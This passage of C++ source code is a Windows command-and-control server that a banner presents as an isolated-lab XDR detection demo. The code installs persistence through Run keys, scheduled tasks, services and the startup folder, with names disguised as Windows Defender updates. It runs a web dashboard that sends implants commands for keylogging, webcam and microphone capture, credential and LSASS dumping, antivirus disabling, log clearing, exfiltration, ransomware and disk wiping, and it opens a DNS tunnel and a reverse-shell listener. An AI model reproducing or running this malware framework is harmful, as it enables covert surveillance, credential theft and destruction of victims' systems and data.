            std::cout << "| [E] Exfil   | [P] Persistence      | [C] Clear Logs         |\n";
            std::cout << "| [S] Screenshot | [K] Keylogger     | [D] Dump Keylogs       |\n";
            std::cout << "| [N] Network Tunnels | [T] TOR | [F12] Remote Desktop       |\n";
            std::cout << "+--------------------------------------------------------------+\n";
            std::cout << "\033[0m"; // Reset color

            // Recent activity log
            std::cout << "\033[35m"; // Magenta color
            std::cout << "\n+----------------------- RECENT ACTIVITY ----------------------+\n";
            int logCount = 0;
            for (auto it = activityLog.rbegin(); it != activityLog.rend() && logCount < 8; ++it, ++logCount) {
                // Truncate long log entries to fit
                std::string logEntry = *it;
                if (logEntry.length() > 60) {
                    logEntry = logEntry.substr(0, 57) + "...";
                }
                std::cout << "| " << std::left << std::setw(60) << logEntry << " |\n";
            }
            // Fill empty log lines
            for (; logCount < 8; ++logCount) {
                std::cout << "| " << std::left << std::setw(60) << " " << " |\n";
            }
            std::cout << "+--------------------------------------------------------------+\n";
            std::cout << "\033[0m"; // Reset color
            
            // Status line
            auto now = std::chrono::system_clock::now();
            auto time_t_now = std::chrono::system_clock::to_time_t(now);
            std::cout << "\n[" << std::put_time(std::localtime(&time_t_now), "%Y-%m-%d %H:%M:%S") 
                      << "] Server running. Total commands sent: " << totalCommandsSent << "\n";
        }
    }

    // DNS tunneling listener (runs on separate thread)
    void dnsListener() {
        SOCKET dnsSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (dnsSocket == INVALID_SOCKET) return;

        sockaddr_in dnsAddr;
        dnsAddr.sin_family = AF_INET;
        dnsAddr.sin_addr.s_addr = INADDR_ANY;
        dnsAddr.sin_port = htons(DNS_PORT);

        if (bind(dnsSocket, (sockaddr*)&dnsAddr, sizeof(dnsAddr)) == 0) {
            logActivity("C2", "DNS_TUNNEL", "DNS tunneling listener started on port " + std::to_string(DNS_PORT));

            char buffer[512];
            sockaddr_in clientAddr;
            int clientAddrLen = sizeof(clientAddr);

            while (serverRunning) {
                int bytes = recvfrom(dnsSocket, buffer, sizeof(buffer), 0, (sockaddr*)&clientAddr, &clientAddrLen);
                if (bytes > 0) {
                    char clientIP[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
                    logActivity("EXFIL", "DNS_TUNNEL", "DNS exfiltration from " + std::string(clientIP));
                }
            }
        }

        closesocket(dnsSocket);
    }

    // Advanced persistence installer
    void installPersistenceMechanisms() {
        logActivity("ATTACK", "PERSISTENCE", "Installing multiple persistence mechanisms");

        // Registry Run key
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            std::string malwarePath = "C:\\Windows\\System32\\svchost.exe -k netsvcs";
            RegSetValueExA(hKey, "WindowsDefenderUpdate", 0, REG_SZ, (BYTE*)malwarePath.c_str(), malwarePath.length() + 1);
            RegCloseKey(hKey);
            logActivity("ATTACK", "REG_PERSIST", "Registry persistence installed: HKCU\\Run\\WindowsDefenderUpdate");
        }

        // Scheduled task
        std::string taskXml = R"(<?xml version="1.0" encoding="UTF-16"?>
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>C:\\Windows\\System32\\cmd.exe</Command>
      <Arguments>/c start /min C:\\temp\\updater.exe</Arguments>
    </Exec>
  </Actions>
</Task>)";

        std::ofstream taskFile("C:\\temp\\task.xml");
        if (taskFile.is_open()) {
            taskFile << taskXml;
            taskFile.close();
            system("schtasks /create /tn \"System Update Service\" /xml C:\\temp\\task.xml /f > nul 2>&1");
            logActivity("ATTACK", "SCHTASK_PERSIST", "Scheduled task persistence created");
        }

        // WMI Event Subscription
        logActivity("ATTACK", "WMI_PERSIST", "Creating WMI event subscription for persistence");

        // Service creation
        SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
        if (hSCManager) {
            SC_HANDLE hService = CreateServiceA(
                hSCManager,
                "WindowsSystemUpdate",
                "Windows System Update Service",
                SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS,
                SERVICE_AUTO_START,
                SERVICE_ERROR_NORMAL,
                "C:\\Windows\\System32\\svchost.exe -k netsvcs",
                NULL, NULL, NULL, NULL, NULL
            );

            if (hService) {
                logActivity("ATTACK", "SERVICE_PERSIST", "Service persistence installed: WindowsSystemUpdate");
                CloseServiceHandle(hService);
            }
            CloseServiceHandle(hSCManager);
        }

        // Startup folder
        char startupPath[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startupPath) == S_OK) {
            std::string lnkPath = std::string(startupPath) + "\\SystemUpdate.lnk";
            logActivity("ATTACK", "STARTUP_PERSIST", "Startup folder persistence: " + lnkPath);
        }
    }

    // Forward declarations
    void runClient(const std::string& serverIP, int serverPort, bool autoElevate = true);
    std::string GetCurrentDirectoryString();
    
    // Include the client implementation
    #include "c2_client.cpp"

    // Native C++ Web Server Implementation
    SOCKET webServerSocket = INVALID_SOCKET;
    std::atomic<bool> webServerRunning(false);
    
    // Function to handle HTTP requests
    void handleHTTPClient(SOCKET clientSocket);
    
    // Function to start the C++ web server
    void startWebServer() {
        logActivity("C2", "WEB_SERVER", "Starting integrated C++ web dashboard...");
        
        webServerSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (webServerSocket == INVALID_SOCKET) {
            logActivity("ERROR", "WEB_SERVER", "Failed to create web server socket");
            return;
        }
        
        // Allow socket reuse
        int opt = 1;
        setsockopt(webServerSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
        
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(8080);
        
        if (bind(webServerSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            logActivity("ERROR", "WEB_SERVER", "Failed to bind web server to port 8080");
            closesocket(webServerSocket);
            return;
        }
        
        if (listen(webServerSocket, SOMAXCONN) == SOCKET_ERROR) {
            logActivity("ERROR", "WEB_SERVER", "Failed to listen on web server socket");
            closesocket(webServerSocket);
            return;
        }
        
        webServerRunning = true;
        
        // Start web server thread
        std::thread webThread([]() {
            logActivity("C2", "WEB_SERVER", "Web dashboard running on http://localhost:8080");
            
            while (webServerRunning) {
                sockaddr_in clientAddr;
                int clientAddrLen = sizeof(clientAddr);
                SOCKET clientSocket = accept(webServerSocket, (sockaddr*)&clientAddr, &clientAddrLen);
                
                if (clientSocket != INVALID_SOCKET) {
                    std::thread clientThread(handleHTTPClient, clientSocket);
                    clientThread.detach();
                }
            }
        });
        
        webThread.detach();
    }
    
    // Helper function to get current directory
    std::string GetCurrentDirectoryString() {
        char buffer[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, buffer);
        return std::string(buffer);
    }
    
    // Function to handle HTTP requests
    void handleHTTPClient(SOCKET clientSocket) {
        char buffer[4096];
        int received = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        
        if (received > 0) {
            buffer[received] = '\0';
            std::string request(buffer);
            
            // Parse HTTP request
            std::string response;
            
            if (request.find("GET / ") == 0 || request.find("GET /index.html") == 0 || request.find("GET /c2_dashboard_complete.html") == 0) {
                // Try to serve c2_dashboard_complete.html from disk first
                std::string dashboardPath = "c2_dashboard_complete.html";
                std::ifstream dashboardFile(dashboardPath);
                
                if (dashboardFile.is_open()) {
                    // Read the complete dashboard file
                    std::string html((std::istreambuf_iterator<char>(dashboardFile)),
                                     std::istreambuf_iterator<char>());
                    dashboardFile.close();
                    
                    response = "HTTP/1.1 200 OK\r\n";
                    response += "Content-Type: text/html\r\n";
                    response += "Content-Length: " + std::to_string(html.length()) + "\r\n";
                    response += "Connection: close\r\n\r\n";
                    response += html;
                } else {
                    // Fallback to embedded dashboard
                const char* htmlContent = R"HTML(<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Command Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #00ff88; font-family: 'Courier New', monospace; padding: 20px; }
        .header { background: linear-gradient(180deg, rgba(0,255,136,0.2) 0%, rgba(0,0,0,0) 100%); padding: 20px; text-align: center; border-bottom: 2px solid #00ff88; margin-bottom: 20px; }
        h1 { font-size: 2.5em; text-shadow: 0 0 20px #00ff88; margin-bottom: 10px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px; }
        .stat-card { background: rgba(0,255,136,0.1); border: 1px solid #00ff88; padding: 20px; border-radius: 8px; text-align: center; }
        .stat-value { font-size: 2em; font-weight: bold; color: #ff0080; }
        .clients-section { background: rgba(0,255,136,0.05); border: 1px solid #00ff88; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
        .client-item { background: rgba(0,0,0,0.5); border: 1px solid #00ff88; padding: 10px; margin: 10px 0; border-radius: 5px; }
        .btn { background: #00ff88; color: #000; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; margin: 5px; }
        .btn:hover { background: #00ff44; box-shadow: 0 0 10px #00ff88; }
        .log-section { background: #000; border: 1px solid #00ff88; border-radius: 8px; padding: 20px; height: 300px; overflow-y: auto; }
        .log-entry { padding: 5px 0; border-bottom: 1px solid rgba(0,255,136,0.2); font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="header">
        <h1>C2 Command & Control Dashboard</h1>
        <p>Real-time monitoring and control interface</p>
    </div>
    <div class="container">
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="activeClients">0</div>
                <div>Active Clients</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalCommands">0</div>
                <div>Commands Sent</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="serverStatus">ONLINE</div>
                <div>Server Status</div>
            </div>
        </div>
        <div class="clients-section">
            <h2>Connected Clients</h2>
            <div id="clientsList"></div>
        </div>
        <div style="margin: 20px 0;">
            <button class="btn" onclick="refreshData()">Refresh</button>
            <button class="btn" onclick="sendCommand('screenshot')">Screenshot All</button>
            <button class="btn" onclick="sendCommand('sysinfo')">System Info</button>
            <button class="btn" onclick="sendCommand('persist')">Install Persistence</button>
        </div>
        <div class="log-section">
            <h2>Activity Log</h2>
            <div id="activityLog"></div>
        </div>
    </div>
    <script>
        function refreshData() {
            fetch('/api/status')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('activeClients').textContent = data.activeClients || 0;
                    document.getElementById('totalCommands').textContent = data.totalCommands || 0;
                    const clientsList = document.getElementById('clientsList');
                    clientsList.innerHTML = '';
                    if (data.clients) {
                        data.clients.forEach(client => {
                            const div = document.createElement('div');
                            div.className = 'client-item';
                            div.innerHTML = '<strong>' + client.hostname + '</strong> (' + client.ip + ')<br>User: ' + client.username + ' | OS: ' + client.os + '<br>Last Seen: ' + client.lastSeen;
                            clientsList.appendChild(div);
                        });
                    }
                    const logDiv = document.getElementById('activityLog');
                    logDiv.innerHTML = '';
                    if (data.logs) {
                        data.logs.forEach(log => {
                            const entry = document.createElement('div');
                            entry.className = 'log-entry';
                            entry.textContent = log;
                            logDiv.appendChild(entry);
                        });
                    }
                })
                .catch(err => console.error('Error:', err));
        }
        function sendCommand(cmd) {
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: cmd})
            })
            .then(() => refreshData())
            .catch(err => console.error('Error:', err));
        }
        setInterval(refreshData, 5000);
        refreshData();
    </script>
</body>
</html>)HTML";
                
                std::string html(htmlContent);
                response = "HTTP/1.1 200 OK\r\n";
                response += "Content-Type: text/html\r\n";
                response += "Content-Length: " + std::to_string(html.length()) + "\r\n";
                response += "Connection: close\r\n\r\n";
                response += html;
                }
            }
            else if (request.find("GET /api/status") == 0) {
                // Generate JSON status
                std::lock_guard<std::mutex> lock(clientsMutex);
                
                std::string json = "{";
                json += "\"server\":{\"status\":\"active\"},";
                json += "\"totalBots\":" + std::to_string(connectedClients.size()) + ",";
                json += "\"activeBots\":" + std::to_string(connectedClients.size()) + ",";
                json += "\"totalCommands\":" + std::to_string(totalCommandsSent) + ",";
                json += "\"clients\":{";
                
                bool first = true;
                for (const auto& [id, client] : connectedClients) {
                    if (!first) json += ",";
                    first = false;
                    
                    // Calculate uptime
                    auto now = std::chrono::system_clock::now();
                    auto uptimeDuration = now - client.firstSeen;
                    auto uptimeMinutes = std::chrono::duration_cast<std::chrono::minutes>(uptimeDuration).count();
                    
                    // Calculate last seen seconds
                    auto lastSeenDuration = now - client.lastSeen;
                    auto lastSeenSeconds = std::chrono::duration_cast<std::chrono::seconds>(lastSeenDuration).count();
                    
                    json += "\"" + id + "\":{";
                    json += "\"hostname\":\"" + client.hostname + "\",";
                    json += "\"ipAddress\":\"" + client.ipAddress + "\",";
                    json += "\"username\":\"" + client.username + "\",";
                    json += "\"os\":\"" + client.osVersion + "\",";
                    json += "\"privileges\":\"" + std::string(client.isElevated ? "Elevated" : "Standard") + "\",";
                    json += "\"lastSeen\":" + std::to_string(client.lastSeen.time_since_epoch().count()) + ",";
                    json += "\"beaconCount\":" + std::to_string(client.beaconCount) + ",";
                    json += "\"uptime\":" + std::to_string(uptimeMinutes) + ",";
                    json += "\"lastSeenSeconds\":" + std::to_string(lastSeenSeconds);
                    json += "}";
                }
                json += "},";
                
                // Add recent activities
                json += "\"activities\":[";
                int logCount = 0;
                std::lock_guard<std::mutex> logLock(logMutex);
                for (auto it = activityLog.rbegin(); it != activityLog.rend() && logCount < 20; ++it, ++logCount) {
                    if (logCount > 0) json += ",";
                    // Escape quotes in log entries
                    std::string logEntry = *it;
                    size_t pos = 0;
                    while ((pos = logEntry.find("\"", pos)) != std::string::npos) {
                        logEntry.replace(pos, 1, "\\\"");
                        pos += 2;
                    }
                    json += "\"" + logEntry + "\"";
                }
                json += "]";
                json += "}";
                
                response = "HTTP/1.1 200 OK\r\n";
                response += "Content-Type: application/json\r\n";
                response += "Content-Length: " + std::to_string(json.length()) + "\r\n";
                response += "Access-Control-Allow-Origin: *\r\n";
                response += "Connection: close\r\n\r\n";
                response += json;
            }
            else if (request.find("POST /api/command") == 0) {
                // Handle command execution
                std::string body = request.substr(request.find("\r\n\r\n") + 4);
                
                // Parse JSON to get clientId and command
                std::string targetClient = "all";
                std::string webCommand;
                
                // Simple JSON parsing
                size_t clientIdPos = body.find("\"clientId\"");
                if (clientIdPos != std::string::npos) {
                    size_t startQuote = body.find("\"", clientIdPos + 10);
                    size_t endQuote = body.find("\"", startQuote + 1);
                    if (startQuote != std::string::npos && endQuote != std::string::npos) {
                        targetClient = body.substr(startQuote + 1, endQuote - startQuote - 1);
                    }
                }
                
                size_t cmdPos = body.find("\"command\"");
                if (cmdPos != std::string::npos) {
                    size_t startQuote = body.find("\"", cmdPos + 9);
                    size_t endQuote = body.find("\"", startQuote + 1);
                    if (startQuote != std::string::npos && endQuote != std::string::npos) {
                        webCommand = body.substr(startQuote + 1, endQuote - startQuote - 1);
                    }
                }
                
                // Convert string command to CommandType
                CommandType cmdType = CMD_BEACON;
                // Basic & Discovery
                if (webCommand == "SYSINFO") cmdType = CMD_SYSINFO;
                else if (webCommand == "PROC" || webCommand == "PROCESS_LIST") cmdType = CMD_PROCESS_LIST;
                else if (webCommand == "NETSTAT" || webCommand == "NETWORK_CONFIG") cmdType = CMD_NETWORK_CONFIG;
                else if (webCommand == "USER_ENUM") cmdType = CMD_USER_ENUM;
                else if (webCommand == "DOMAIN_INFO") cmdType = CMD_DOMAIN_INFO;
                else if (webCommand == "SOFTWARE_ENUM") cmdType = CMD_SOFTWARE_ENUM;
                
                // Collection
                else if (webCommand == "SCREENSHOT") cmdType = CMD_SCREENSHOT;
                else if (webCommand == "KEYLOG:START") cmdType = CMD_KEYLOG_START;
                else if (webCommand == "KEYLOG:DUMP") cmdType = CMD_KEYLOG_DUMP;
                else if (webCommand == "CLIPBOARD") cmdType = CMD_CLIPBOARD;
                else if (webCommand == "BROWSER_CREDS") cmdType = CMD_BROWSER_CREDS;
                else if (webCommand == "FILE_SEARCH") cmdType = CMD_FILE_SEARCH;
                else if (webCommand == "WEBCAM:CAPTURE") cmdType = CMD_WEBCAM_CAPTURE;
                else if (webCommand == "MIC:RECORD:START") cmdType = CMD_MICROPHONE_RECORD;
                else if (webCommand == "SCREEN_RECORD") cmdType = CMD_SCREEN_RECORD;
                
                // Execution
                else if (webCommand == "SHELL_EXEC") cmdType = CMD_SHELL_EXEC;
                else if (webCommand == "POWERSHELL") cmdType = CMD_POWERSHELL;
                else if (webCommand == "INJECT_PROCESS") cmdType = CMD_INJECT_PROCESS;
                else if (webCommand == "REVERSE_SHELL") cmdType = CMD_REVERSE_SHELL;
                else if (webCommand == "REMOTE_DESKTOP") cmdType = CMD_REMOTE_DESKTOP;
                
                // Persistence
                else if (webCommand == "PERSISTENCE" || webCommand == "REGISTRY_PERSIST") cmdType = CMD_REGISTRY_PERSIST;
                else if (webCommand == "INSTALL_SERVICE") cmdType = CMD_INSTALL_SERVICE;
                else if (webCommand == "SCHEDULED_TASK") cmdType = CMD_SCHEDULED_TASK;
                else if (webCommand == "WMI_PERSIST") cmdType = CMD_WMI_PERSIST;
                else if (webCommand == "STARTUP_FOLDER") cmdType = CMD_STARTUP_FOLDER;
                else if (webCommand == "BOOTKIT_INSTALL") cmdType = CMD_BOOTKIT_INSTALL;
                
                // Lateral Movement
                else if (webCommand == "PORT_SCAN") cmdType = CMD_PORT_SCAN;
                else if (webCommand == "SMB_SCAN") cmdType = CMD_SMB_SCAN;
                else if (webCommand == "PSEXEC") cmdType = CMD_PSEXEC;
                else if (webCommand == "WMI_EXEC") cmdType = CMD_WMI_EXEC;
                else if (webCommand == "RDP_EXEC") cmdType = CMD_RDP_EXEC;
                else if (webCommand == "PASS_THE_HASH") cmdType = CMD_PASS_THE_HASH;
                else if (webCommand == "MIMIKATZ") cmdType = CMD_MIMIKATZ_EXEC;
                
                // Privilege Escalation
                else if (webCommand == "ELEVATE" || webCommand == "UAC_BYPASS") cmdType = CMD_UAC_BYPASS;
                else if (webCommand == "TOKEN_STEAL") cmdType = CMD_TOKEN_STEAL;
                else if (webCommand == "EXPLOIT_SUGGESTER") cmdType = CMD_EXPLOIT_SUGGESTER;
                else if (webCommand == "LSASS_DUMP") cmdType = CMD_LSASS_DUMP;
                else if (webCommand == "SAM_DUMP") cmdType = CMD_SAM_DUMP;
                
                // Defense Evasion
                else if (webCommand == "DISABLE_AV") cmdType = CMD_DISABLE_AV;
                else if (webCommand == "CLEARLOG" || webCommand == "CLEAR_LOGS") cmdType = CMD_CLEAR_LOGS;
                else if (webCommand == "TIMESTOMP") cmdType = CMD_TIMESTOMP;
                else if (webCommand == "PROCESS_HOLLOW") cmdType = CMD_PROCESS_HOLLOW;
                else if (webCommand == "ROOTKIT_INSTALL") cmdType = CMD_ROOTKIT_INSTALL;
                else if (webCommand == "AMSI_BYPASS") cmdType = CMD_AMSI_BYPASS;
                else if (webCommand == "ETW_DISABLE") cmdType = CMD_ETW_DISABLE;
                
                // Exfiltration
                else if (webCommand == "STAGE_FILES") cmdType = CMD_STAGE_FILES;
                else if (webCommand == "COMPRESS_DATA") cmdType = CMD_COMPRESS_DATA;
                else if (webCommand == "EXFIL_HTTP") cmdType = CMD_EXFIL_HTTP;
                else if (webCommand == "EXFIL_DNS") cmdType = CMD_EXFIL_DNS;
                else if (webCommand == "EXFIL_ICMP") cmdType = CMD_EXFIL_ICMP;
                else if (webCommand == "EXFIL_EMAIL") cmdType = CMD_EXFIL_EMAIL;
                else if (webCommand == "CLOUD_UPLOAD") cmdType = CMD_CLOUD_UPLOAD;
                
                // Impact
                else if (webCommand == "RANSOMWARE") cmdType = CMD_RANSOMWARE;
                else if (webCommand == "WIPE_DISK") cmdType = CMD_WIPE_DISK;
                else if (webCommand == "CORRUPT_BOOT") cmdType = CMD_CORRUPT_BOOT;
                else if (webCommand == "CRYPTO_MINER") cmdType = CMD_CRYPTO_MINER;
                
                // Advanced Network Evasion
                else if (webCommand == "TOR_CONNECT") cmdType = CMD_TOR_CONNECT;
                else if (webCommand == "TOR_API_CALL") cmdType = CMD_TOR_API_CALL;
                else if (webCommand == "REVERSE_SSH") cmdType = CMD_REVERSE_SSH;
                else if (webCommand == "NETCAT_TUNNEL") cmdType = CMD_NETCAT_TUNNEL;
                else if (webCommand == "SOCAT_RELAY") cmdType = CMD_SOCAT_RELAY;
                
                // Execute command
                std::lock_guard<std::mutex> lock(clientsMutex);
                int commandsSent = 0;
                
                if (targetClient == "all") {
                    for (const auto& [id, client] : connectedClients) {
                        if (client.isActive) {
                            clientCommandQueue[id].push_back(cmdType);
                            commandsSent++;
                        }
                    }
                    logActivity("C2", "WEB_COMMAND", "Received " + webCommand + " from web dashboard for ALL clients");
                } else {
                    if (connectedClients.find(targetClient) != connectedClients.end() && connectedClients[targetClient].isActive) {
                        clientCommandQueue[targetClient].push_back(cmdType);
                        commandsSent++;
                        logActivity("C2", "WEB_COMMAND", "Received " + webCommand + " from web dashboard for " + targetClient);
                    }
                }
                
                std::string json = "{\"status\":\"ok\",\"commandsSent\":" + std::to_string(commandsSent) + "}";
                response = "HTTP/1.1 200 OK\r\n";
                response += "Content-Type: application/json\r\n";
                response += "Content-Length: " + std::to_string(json.length()) + "\r\n";
                response += "Access-Control-Allow-Origin: *\r\n";
                response += "Connection: close\r\n\r\n";
                response += json;
            }
            else if (request.find("GET /api/activity") == 0) {
                // Return recent activity
                std::string json = "{\"activities\":[";
                
                std::lock_guard<std::mutex> lock(logMutex);
                int count = 0;
                for (auto it = activityLog.rbegin(); it != activityLog.rend() && count < 50; ++it, ++count) {
                    if (count > 0) json += ",";
                    // Escape quotes in log entries
                    std::string logEntry = *it;
                    size_t pos = 0;
                    while ((pos = logEntry.find("\"", pos)) != std::string::npos) {
                        logEntry.replace(pos, 1, "\\\"");
                        pos += 2;
                    }
                    json += "\"" + logEntry + "\"";
                }
                json += "]}";
                
                response = "HTTP/1.1 200 OK\r\n";
                response += "Content-Type: application/json\r\n";
                response += "Content-Length: " + std::to_string(json.length()) + "\r\n";
                response += "Access-Control-Allow-Origin: *\r\n";
                response += "Connection: close\r\n\r\n";
                response += json;
            }
            else {
                // 404 Not Found
                response = "HTTP/1.1 404 Not Found\r\n";
                response += "Content-Type: text/plain\r\n";
                response += "Content-Length: 9\r\n";
                response += "Connection: close\r\n\r\n";
                response += "Not Found";
            }
            
            send(clientSocket, response.c_str(), response.length(), 0);
        }
        
        closesocket(clientSocket);
    }
    
    // Forward declarations for queue functions
    void executeQueuedCommand(const std::string& targetClientId, const std::string& command);
    void executeGlobalQueuedCommand(const std::string& command);
    
    // Command queue monitor function
    void processCommandQueue() {
        std::string queueDir = "C:\\Windows\\Temp\\C2_CommandQueue";
        
        // Create directory if it doesn't exist
        CreateDirectoryA(queueDir.c_str(), NULL);
        
        // Look for command files
        WIN32_FIND_DATAA findData;
        std::string searchPattern = queueDir + "\\cmd_*.json";
        HANDLE hFind = FindFirstFileA(searchPattern.c_str(), &findData);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::string filename = findData.cFileName;
                std::string fullPath = queueDir + "\\" + filename;
                
                logActivity("DEBUG", "QUEUE_COMMAND_FOUND", "Processing queued command: " + filename);
                
                // Read command file
                std::ifstream cmdFile(fullPath);
                if (cmdFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(cmdFile)),
                                       std::istreambuf_iterator<char>());
                    cmdFile.close();
                    
                    try {
                        // Parse JSON (simple parsing)
                        std::string clientId;
                        std::string command;
                        
                        // Extract client_id
                        size_t clientIdPos = content.find("\"client_id\":");
                        if (clientIdPos != std::string::npos) {
                            size_t start = content.find("\"", clientIdPos + 12) + 1;
                            size_t end = content.find("\"", start);
                            if (start != std::string::npos && end != std::string::npos) {
                                clientId = content.substr(start, end - start);
                            }
                        }
                        
                        // Extract command
                        size_t commandPos = content.find("\"command\":");
                        if (commandPos != std::string::npos) {
                            size_t start = content.find("\"", commandPos + 10) + 1;
                            size_t end = content.find("\"", start);
                            if (start != std::string::npos && end != std::string::npos) {
                                command = content.substr(start, end - start);
                            }
                        }
                        
                        logActivity("DEBUG", "QUEUE_COMMAND_PARSED", "Client: " + clientId + ", Command: " + command);
                        
                        // Execute command on target client
                        if (!clientId.empty() && !command.empty()) {
                            executeQueuedCommand(clientId, command);
                        } else if (!command.empty()) {
                            // Global command - send to all clients
                            executeGlobalQueuedCommand(command);
                        }
                        
                    } catch (const std::exception& e) {
                        logActivity("ERROR", "QUEUE_PARSE", "Failed to parse command file: " + fullPath);
                    }
                    
                    // Delete processed file
                    DeleteFileA(fullPath.c_str());
                }
                
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }
    }
    
    // Execute queued command on specific client
    void executeQueuedCommand(const std::string& targetClientId, const std::string& command) {
        std::lock_guard<std::mutex> lock(clientsMutex);
        
        logActivity("DEBUG", "EXECUTE_QUEUED_CMD", "Executing '" + command + "' on client " + targetClientId);
        
        for (auto& [clientId, client] : connectedClients) {
            if (clientId == targetClientId && client.isActive) {
                logActivity("DEBUG", "CLIENT_FOUND", "Found target client: " + clientId);
                
                // Map command to action
                if (command == "SCREENSHOT") {
                    executeScreenshotCapture(client.socket, clientId);
                } else if (command == "KEYLOG:START") {
                    executeKeylogger(client.socket, clientId);
                } else if (command == "KEYLOG:DUMP") {
                    executeKeyloggerDump(client.socket, clientId);
                } else if (command == "SYSINFO") {
                    generateC2Traffic(client.socket, clientId, CMD_SYSINFO);
                } else if (command == "SHELL") {
                    // Send shell command directly
                    std::string shellCmd = "SHELL:INIT\n";
                    std::string encrypted = xorEncrypt(shellCmd);
                    send(client.socket, encrypted.c_str(), encrypted.size(), 0);
                    logActivity("DEBUG", "SHELL_COMMAND", "Sent shell initialization");
                } else if (command == "WEBCAM:CAPTURE") {
                    executeWebcamCapture(client.socket, clientId);
                } else if (command == "AUDIO:RECORD") {
                    executeMicrophoneRecord(client.socket, clientId);
                } else if (command == "ELEVATE") {
                    generateC2Traffic(client.socket, clientId, CMD_UAC_BYPASS);
                } else if (command == "PERSIST") {
                    generateC2Traffic(client.socket, clientId, CMD_PROCESS_HOLLOW);
                } else if (command == "EXFIL") {
                    generateC2Traffic(client.socket, clientId, CMD_EXFIL_HTTP);
                } else if (command == "KILL") {
                    // Send kill command directly
                    std::string killCmd = "TERMINATE\n";
                    std::string encrypted = xorEncrypt(killCmd);
                    send(client.socket, encrypted.c_str(), encrypted.size(), 0);
                    logActivity("DEBUG", "KILL_COMMAND", "Sent termination command");
                } else {
                    // Send as generic text command
                    std::string textCmd = command + "\n";
                    std::string encrypted = xorEncrypt(textCmd);
                    send(client.socket, encrypted.c_str(), encrypted.size(), 0);
                    logActivity("DEBUG", "GENERIC_COMMAND", "Sent generic command: " + command);
                }
                
                return;
            }
        }
        
        logActivity("WARNING", "CLIENT_NOT_FOUND", "Target client not found or inactive: " + targetClientId);
    }
    
    // Execute global command on all clients
    void executeGlobalQueuedCommand(const std::string& command) {
        std::lock_guard<std::mutex> lock(clientsMutex);
        
        logActivity("DEBUG", "EXECUTE_GLOBAL_CMD", "Executing global command: " + command);
        
        for (auto& [clientId, client] : connectedClients) {
            if (client.isActive) {
                executeQueuedCommand(clientId, command);
            }
        }
    }

    // Main server function
    void runServer(bool startWebDashboard = true) {
        // Enable ANSI colors in Windows console
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        DWORD dwMode = 0;
        GetConsoleMode(hConsole, &dwMode);
        SetConsoleMode(hConsole, dwMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);

        std::cout << "\033[31m"; // Red
        std::cout << "+================================================================+\n";
        std::cout << "|     ADVANCED C2 SERVER - PALO ALTO NETWORKS ESCAPE ROOM       |\n";
        std::cout << "|                  XDR DETECTION DEMO SYSTEM                     |\n";
        std::cout << "|                                                                |\n";
        std::cout << "|  WARNING: This will trigger comprehensive XDR alerts!         |\n";
        std::cout << "|  For isolated lab environment demonstration only              |\n";
        std::cout << "+================================================================+\n";
        std::cout << "\033[0m\n"; // Reset color

        // Create directories
        CreateDirectoryA("C:\\temp", NULL);
        CreateDirectoryA("C:\\temp\\c2_data", NULL);
        CreateDirectoryA("C:\\temp\\exfil", NULL);
        CreateDirectoryA("C:\\temp\\logs", NULL);

        logActivity("C2", "INIT", "Advanced C2 Server initializing...");

        // Initialize Winsock
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            logActivity("ERROR", "INIT", "Failed to initialize Winsock");
            return;
        }

        // Install persistence (for demo purposes)
        installPersistenceMechanisms();

        // Start web dashboard if requested
        if (startWebDashboard) {
            startWebServer();
        }

        // Create reverse shell listener on alternate port
        std::thread reverseShellListener([]() {
            SOCKET shellSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (shellSocket != INVALID_SOCKET) {
                sockaddr_in shellAddr;
                shellAddr.sin_family = AF_INET;
                shellAddr.sin_addr.s_addr = INADDR_ANY;
                shellAddr.sin_port = htons(4444); // Reverse shell port

                if (bind(shellSocket, (sockaddr*)&shellAddr, sizeof(shellAddr)) == 0) {
                    listen(shellSocket, 10);
                    logActivity("C2", "REVERSE_SHELL", "Reverse shell listener on port 4444");

